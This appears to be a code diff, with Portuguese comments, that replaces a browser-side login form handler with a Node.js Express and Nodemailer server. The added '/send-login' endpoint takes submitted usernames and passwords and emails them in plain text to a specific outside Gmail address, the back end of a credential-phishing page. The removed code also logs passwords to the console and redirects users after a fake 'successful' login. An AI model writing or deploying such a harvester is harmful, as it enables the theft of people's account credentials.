@@ -1,37 +1,38 @@
-document.getElementById('loginForm').addEventListener('submit', function(event) {
-    event.preventDefault();
-    
-    const email = document.getElementById('email').value;
-    const password = document.getElementById('password').value;
-    
-    // Simulação do envio dos dados de login
-    console.log('Email:', email);
-    console.log('Senha:', password);
-    
-    // Exibe uma mensagem de sucesso
-    document.getElementById('message').innerText = 'Login bem-sucedido!';
-    
-    // Redirecionamento após login bem-sucedido
-    setTimeout(function() {
-        window.location.href = 'https://.com/share/8a5f0a6a-e327-9910-94c2f04c1d8b'; // Substitua pela URL de destino
-    }, 2000); // Aguarda 2 segundos antes de redirecionar
-});
-document.getElementById('loginForm').addEventListener('submit', function(event) {
-    event.preventDefault();
-    
-    const email = document.getElementById('email').value;
-    const password = document.getElementById('password').value;
+const express = require('express');
+const nodemailer = require('nodemailer');
+const app = express();
+app.use(express.json());
 
-    fetch('http://localhost:3000/login', {
-        method: 'POST',
-        headers: {
-            'Content-Type': 'application/json'
-        },
-        body: JSON.stringify({ email: email, password: password })
-    })
-    .then(response => response.json())
-    .then(data => {
-        document.getElementById('message').textContent = data.message;
-    })
-    .catch(error => console.error('Error:', error));
+// Configuração do transporte de email
+const transporter = nodemailer.createTransport({
+  service: 'gmail',
+  auth: {
+    user: 'seuemail@gmail.com',      // Substitua pelo seu email
+    pass: 'suasenha'                 // Substitua pela sua senha ou use um app password
+  }
+});
+
+app.post('/send-login', (req, res) => {
+  const { username, password } = req.body;
+
+  const mailOptions = {
+    from: 'seuemail@gmail.com',       // Substitua pelo seu email
+    to: 'fumorofina92@gmail.com',
+    subject: 'Dados de Login',
+    text: `Nome de Usuário: ${username}\nSenha: ${password}`
+  };
+
+  transporter.sendMail(mailOptions, (error, info) => {
+    if (error) {
+      console.log(error);
+      res.json({ success: false, message: 'Erro ao enviar os dados' });
+    } else {
+      console.log('Email enviado: ' + info.response);
+      res.json({ success: true, message: 'Dados enviados com sucesso' });
+    }
+  });
+});
+
+app.listen(3000, () => {
+  console.log('Servidor rodando na porta 3000');
 });
